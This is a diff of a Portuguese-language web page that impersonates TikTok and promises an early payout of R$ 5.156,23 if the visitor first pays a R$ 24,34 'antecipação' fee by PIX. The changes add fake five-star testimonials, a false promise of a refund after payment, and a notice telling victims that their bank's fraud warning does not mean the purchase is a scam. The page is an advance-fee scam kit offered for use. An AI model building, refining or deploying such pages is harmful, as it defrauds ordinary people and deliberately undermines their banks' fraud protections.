@@ -4,15 +4,17 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>TikTok - Antecipação Prioritária</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         * { -webkit-font-smoothing: antialiased; }
 
-        .btn-tiktok {
+        .btn-tiktok-main {
             background: linear-gradient(135deg, #FE2C55 0%, #ff0040 100%);
             transition: transform 0.15s;
         }
-        .btn-tiktok:active { transform: scale(0.97); }
+        .btn-tiktok-main:active { transform: scale(0.97); }
 
         /* Relógio animado */
         .clock-base {
@@ -43,73 +45,9 @@
         .premium-card {
             background: linear-gradient(135deg, #161823 0%, #1a1f2e 50%, #0f1117 100%);
         }
-
-        /* Spinner */
-        .co-spinner {
-            width: 18px; height: 18px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: co-spin 0.8s linear infinite;
-            display: inline-block; margin-left: 8px; vertical-align: middle;
-        }
-        @keyframes co-spin { to { transform: rotate(360deg); } }
-
-        .co-qr-box {
-            background: #f1f5f9; border-radius: 0;
-            width: 155px; height: 155px;
-            margin: 0 auto 12px;
-            display: flex; align-items: center; justify-content: center;
-            padding: 10px; box-sizing: border-box;
-        }
-        .co-qr-img { width: 100%; height: 100%; object-fit: contain; border-radius: 0; }
-
-        .co-success-toast {
-            position: fixed; top: 16px; left: 16px; right: 16px;
-            background: #ecfdf5; border: 1px solid #10b981; color: #065f46;
-            padding: 12px 18px; border-radius: 12px; font-size: 13px; font-weight: 600;
-            display: flex; align-items: center; gap: 8px;
-            box-shadow: 0 8px 24px rgba(16,185,129,0.15); z-index: 9999;
-            animation: slideDown 0.4s cubic-bezier(0.16,1,0.3,1) forwards;
-        }
-        .co-success-toast.fade-out { animation: slideUp 0.4s ease forwards; }
-        @keyframes slideDown { from { opacity:0; transform:translateY(-30px); } to { opacity:1; transform:translateY(0); } }
-        @keyframes slideUp { from { opacity:1; transform:translateY(0); } to { opacity:0; transform:translateY(-30px); } }
-
-        .co-error-box {
-            background: #fef2f2; border: 1px solid #fca5a5; color: #991b1b;
-            border-radius: 10px; padding: 12px 14px; font-size: 13px; font-weight: 600;
-            display: flex; align-items: center; gap: 8px; margin-bottom: 10px;
-        }
-
-        .pix-code-truncated {
-            font-size: 11px; color: #94a3b8; text-align: center;
-            text-overflow: ellipsis; overflow: hidden; white-space: nowrap; width: 100%;
-            margin: 4px 0 8px;
-        }
-
-        .co-btn-copiar {
-            width: 100%; height: 52px;
-            background: linear-gradient(135deg, #FE2C55 0%, #ff0040 100%);
-            border: none; border-radius: 14px; color: #fff;
-            font-size: 15px; font-weight: 800;
-            display: flex; align-items: center; justify-content: center;
-            cursor: pointer; margin-bottom: 8px;
-            box-shadow: 0 4px 14px rgba(255,0,80,0.2);
-            transition: transform 0.1s;
-        }
-        .co-btn-copiar:active { transform: scale(0.98); }
-
-        .co-btn-ja-efetuei {
-            width: 100%; height: 46px;
-            background: #f1f5f9; border: none; color: #4b5563;
-            border-radius: 12px; font-size: 13px; font-weight: 600;
-            display: flex; align-items: center; justify-content: center;
-            cursor: pointer; margin-bottom: 8px;
-        }
     </style>
 </head>
-<body class="text-[#161823] bg-white">
+<body class="text-[#161823] bg-white block">
 
     <!-- Barra de aviso -->
     <div class="bg-black text-white text-center py-3 px-4 text-[12px] font-bold uppercase tracking-tight leading-tight w-full sticky top-0 z-50">
@@ -121,7 +59,7 @@
 
         <!-- Header com logo e saldo -->
         <div class="flex flex-col items-center px-5 py-8 border-b border-gray-50">
-            <img src="https://images.seeklogo.com/logo-png/37/2/tiktok-app-logo-png_seeklogo-375617.png"
+            <img src="logo/1764285383236-dgznvpr1er3ddzdrfg8cyh8hd.webp"
                  alt="TikTok" class="h-20 w-20 object-contain mb-4">
             <div class="text-center">
                 <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Saldo em Processamento</span>
@@ -156,7 +94,7 @@
                 </div>
 
                 <!-- Botão principal -->
-                <button onclick="abrirCheckout()" class="btn-tiktok block w-full text-white text-center py-5 rounded-2xl shadow-xl">
+                <button onclick="abrirCheckout()" class="btn-tiktok-main block w-full text-white text-center py-5 rounded-2xl shadow-xl">
                     <span class="block font-[900] text-xl uppercase leading-none">ANTECIPAR E RECEBER TUDO</span>
                     <span class="block font-medium text-sm opacity-90 mt-1 uppercase tracking-tighter">Receber R$ 5.156,23 Agora</span>
                 </button>
@@ -220,113 +158,166 @@
         </footer>
     </div>
 
-    <!-- ====================== CHECKOUT OVERLAY ====================== -->
+    <!-- ====================== CHECKOUT OVERLAY (PADRONIZADO E IDÊNTICO AO FRONT) ====================== -->
     <div id="page-checkout" class="hidden fixed inset-0 z-[9999] bg-[#f8fafc] overflow-y-auto">
 
-        <div class="bg-[#FE2C55] text-white text-center py-3 px-4 text-[12px] font-bold uppercase tracking-tight w-full sticky top-0 z-50">
+        <!-- Barra "PAGAMENTO 100% SEGURO" -->
+        <div class="co-header-bar">
             PAGAMENTO 100% SEGURO
         </div>
 
-        <div class="max-w-md mx-auto pb-16 px-4 pt-6">
+        <div class="co-page-bg">
 
-            <!-- Etapa 1 -->
+            <!-- STEP 1: Identificação -->
             <div id="co-step-1">
-                <!-- Card produto -->
-                <div class="bg-white rounded-2xl p-5 shadow-sm border border-gray-100 mb-4">
-                    <div class="flex items-center gap-3">
-                        <div class="w-12 h-12 rounded-xl border border-gray-200 flex items-center justify-center overflow-hidden flex-shrink-0">
-                            <img src="https://images.seeklogo.com/logo-png/37/2/tiktok-app-logo-png_seeklogo-375617.png" alt="TikTok" class="w-full h-full object-cover">
+                <!-- Card Produto -->
+                <div class="co-card co-product-card">
+                    <div class="co-product-row">
+                        <div class="co-tiktok-box">
+                            <img src="logo/1764285383236-dgznvpr1er3ddzdrfg8cyh8hd.webp" alt="Logo" class="co-logo-img">
                         </div>
-                        <div>
-                            <div class="text-[15px] font-bold text-gray-900">Antecipação Prioritária + Bônus</div>
+                        <div class="co-product-info">
+                            <div class="co-product-name">Antecipação Prioritária + Bônus - Estorno após Pagamento.</div>
                         </div>
                     </div>
-                    <div class="border-t border-gray-100 mt-4 pt-3 flex justify-between items-center">
-                        <span class="text-sm text-gray-500 font-medium">Total</span>
-                        <span class="text-sm font-semibold text-gray-600">R$ 24,34</span>
+                    <div class="co-divider"></div>
+                    <div class="co-price-row">
+                        <span class="co-price-label">Total</span>
+                        <span class="co-price-value">R$ 24,34</span>
                     </div>
                 </div>
 
-                <!-- Card identificação -->
-                <div class="bg-white rounded-2xl p-5 shadow-sm border border-gray-100 mb-4">
-                    <div class="flex items-center gap-2 mb-4">
-                        <div class="w-6 h-6 bg-[#FE2C55] rounded-full flex items-center justify-center flex-shrink-0">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="none" stroke="white" stroke-width="2" viewBox="0 0 24 24">
-                                <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
+                <!-- Card Identificação -->
+                <div class="co-card co-form-card">
+                    <div class="co-form-header">
+                        <div class="co-form-badge">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/>
+                                <circle cx="12" cy="7" r="4"/>
                             </svg>
                         </div>
-                        <h2 class="text-[16px] font-bold text-gray-900">Identificação</h2>
+                        <h2 class="co-form-title">Identificação</h2>
                     </div>
-                    <label class="block text-sm font-semibold text-gray-600 mb-2">Nome completo</label>
-                    <input type="text" id="checkout-name" placeholder="Nome e sobrenome"
-                           class="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm outline-none focus:border-[#FE2C55] transition-colors">
+                    <label class="co-label" for="checkout-name">Nome completo</label>
+                    <input type="text" id="checkout-name" placeholder="Nome e sobrenome" class="co-input" autocomplete="name">
                 </div>
 
                 <div id="co-error" class="hidden co-error-box">
                     <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" stroke="#dc2626" stroke-width="2.5" viewBox="0 0 24 24" style="flex-shrink:0"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-                    <span id="co-error-text"></span>
+                    <span id="co-error-text" class="ml-2"></span>
                 </div>
 
-                <button id="btn-pagar-agora" onclick="gerarPix()" class="btn-tiktok w-full text-white font-[900] py-4 rounded-2xl text-[15px] uppercase tracking-wider mb-3 flex items-center justify-center gap-2">
+                <!-- Botão PAGAR AGORA (fora do card) -->
+                <button type="button" id="btn-pagar-agora" onclick="gerarPix()" class="co-btn-pagar">
                     PAGAR AGORA
                 </button>
-                <p class="text-center text-[11px] text-gray-400 flex items-center justify-center gap-1">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="none" stroke="#10b981" stroke-width="2.5" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+                <p class="co-secure-text">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;margin-right:4px">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                        <polyline points="9 12 11 14 15 10"/>
+                    </svg>
                     Pagamento seguro via PIX com aprovação imediata.
                 </p>
-            </div>
 
-            <!-- Etapa 2: QR Code -->
-            <div id="co-step-2" class="hidden">
-                <div class="bg-white rounded-2xl p-5 shadow-sm border border-gray-100 mb-4">
-                    <div class="flex items-center gap-3">
-                        <div class="w-12 h-12 rounded-xl border border-gray-200 flex items-center justify-center overflow-hidden flex-shrink-0">
-                            <img src="https://images.seeklogo.com/logo-png/37/2/tiktok-app-logo-png_seeklogo-375617.png" alt="TikTok" class="w-full h-full object-cover">
+                <!-- Carrossel depoimentos (etapa 1) -->
+                <div class="co-reviews-carousel">
+                    <div class="co-reviews-track">
+                        <div class="co-review-card">
+                            <div class="co-review-header">
+                                <img src="https://d1frh8xn9wll8b.cloudfront.net/reviews/1756588901009-photo_2025-08-30_18-12-20.webp" alt="Larissa" class="co-review-avatar" loading="lazy">
+                                <div>
+                                    <div class="co-review-name">Larissa</div>
+                                    <div class="co-review-stars"><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span></div>
+                                </div>
+                            </div>
+                            <p class="co-review-text">"Eu to amandoooo, fazendo muito dindin todo dia mdsss kkkk amooooo"</p>
                         </div>
-                        <div><div class="text-[15px] font-bold text-gray-900">Antecipação Prioritária + Bônus</div></div>
+                        <div class="co-review-card">
+                            <div class="co-review-header">
+                                <img src="https://d1frh8xn9wll8b.cloudfront.net/reviews/1756591742828-photo_2025-08-30_18-12-16.webp" alt="Lucas" class="co-review-avatar" loading="lazy">
+                                <div>
+                                    <div class="co-review-name">Lucas</div>
+                                    <div class="co-review-stars"><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span><span class="co-star">★</span></div>
+                                </div>
+                            </div>
+                            <p class="co-review-text">"Familia ta funcionando de mais pingou na hora o pix 💸🏆"</p>
+                        </div>
                     </div>
-                    <div class="border-t border-gray-100 mt-4 pt-3 flex justify-between items-center">
-                        <span class="text-sm text-gray-500 font-medium">Total</span>
-                        <span class="text-sm font-semibold text-gray-600">R$ 24,34</span>
+                </div>
+            </div><!-- fim co-step-1 -->
+
+            <!-- STEP 2: QR Code -->
+            <div id="co-step-2" class="hidden">
+                <!-- Card Produto -->
+                <div class="co-card co-product-card">
+                    <div class="co-product-row">
+                        <div class="co-tiktok-box">
+                            <img src="logo/1764285383236-dgznvpr1er3ddzdrfg8cyh8hd.webp" alt="Logo" class="co-logo-img">
+                        </div>
+                        <div class="co-product-info">
+                            <div class="co-product-name">Antecipação Prioritária + Bônus - Estorno após Pagamento.</div>
+                        </div>
+                    </div>
+                    <div class="co-divider"></div>
+                    <div class="co-price-row">
+                        <span class="co-price-label">Total</span>
+                        <span class="co-price-value">R$ 24,34</span>
                     </div>
                 </div>
 
-                <h2 class="text-[18px] font-bold text-center text-gray-900 mb-4">Escaneie o QR-code ou copie o código.</h2>
+                <h2 class="co-qr-title">Escaneie o QR-code ou copie o código.</h2>
 
+                <!-- QR Code -->
                 <div class="co-qr-box">
                     <img id="qr-img" src="" alt="QR Code PIX" class="co-qr-img">
                 </div>
 
-                <div class="flex justify-between items-center px-1 mb-1">
-                    <span class="text-sm text-gray-400 font-medium">Valor PIX:</span>
-                    <span class="text-[22px] font-black text-gray-900">R$ 24,34</span>
+                <!-- Valor e código truncado -->
+                <div class="co-valor-pix-row">
+                    <span class="co-valor-pix-label">Valor PIX:</span>
+                    <span class="co-valor-pix-value">R$ 24,34</span>
                 </div>
-                <div class="pix-code-truncated" id="pix-code-truncated"></div>
+                <div class="co-pix-key-truncated" id="pix-code-truncated"></div>
 
+                <!-- Botões -->
                 <button onclick="copiarPix()" class="co-btn-copiar">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" stroke="white" stroke-width="2.5" viewBox="0 0 24 24" style="margin-right:6px"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px">
+                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+                    </svg>
                     Copiar PIX
                 </button>
 
                 <button id="btn-ja-efetuei" onclick="verificarPagamento()" class="co-btn-ja-efetuei">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="margin-right:6px"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px">
+                        <polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/>
+                        <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/>
+                    </svg>
                     Já efetuei o pagamento!
                 </button>
 
-                <div class="flex items-start text-[11px] text-gray-400 leading-relaxed mb-3">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="none" stroke="#6b7280" stroke-width="2" viewBox="0 0 24 24" style="margin-right:6px;flex-shrink:0;margin-top:2px"><polyline points="9 18 15 12 9 6"/></svg>
-                    <span>Você será redirecionado automaticamente após a confirmação. Se preferir, clique em <strong>"Já efetuei o pagamento!"</strong></span>
+                <!-- Aviso redirecionamento -->
+                <div class="co-redirect-notice">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#6b7280" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:8px;flex-shrink:0">
+                        <polyline points="9 18 15 12 9 6"/>
+                    </svg>
+                    <span>Você será redirecionado automaticamente após a confirmação do pagamento. Se preferir, clique em <strong>"Já efetuei o pagamento!"</strong> para verificar se o pagamento foi aprovado.</span>
                 </div>
 
-                <div class="bg-[#eff6ff] border border-[#bfdbfe] rounded-xl p-3 mb-4">
-                    <div class="flex items-center gap-2 text-[#1e3a8a] font-bold text-[12px] mb-1">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" fill="none" stroke="#1e3a8a" stroke-width="2" viewBox="0 0 24 24" style="flex-shrink:0"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
+                <!-- Aviso banco -->
+                <div class="co-bank-alert">
+                    <div class="co-bank-alert-header">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#374151" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:8px;flex-shrink:0">
+                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                            <path d="m9 12 2 2 4-4"/>
+                        </svg>
                         <strong>Seu banco pode exibir um alerta</strong>
                     </div>
-                    <p class="text-[#1e40af] text-[11px] leading-relaxed">Alguns bancos mostram um aviso automático em qualquer Pix para um destinatário novo. Isso é normal. Confira os dados e conclua o pagamento.</p>
+                    <p class="co-bank-alert-text">Alguns bancos mostram um aviso automático em qualquer Pix para um destinatário novo. Isso é normal e não significa que a compra é golpe. Confira os dados e conclua o pagamento com tranquilidade.</p>
                 </div>
-            </div>
-        </div>
+            </div><!-- fim co-step-2 -->
+
+        </div><!-- fim co-page-bg -->
     </div>
 
     <input type="text" id="pix-copy-input" style="position:absolute;left:-9999px;" readonly>
@@ -386,7 +377,6 @@
                     });
                     const data = await resp.json();
                     if (data.status === 'approved') { aoAprovar(); }
-                    else if (data.status && data.status !== 'waiting_payment') { pararPolling(); }
                 } catch (e) {}
             }, 6000);
         }
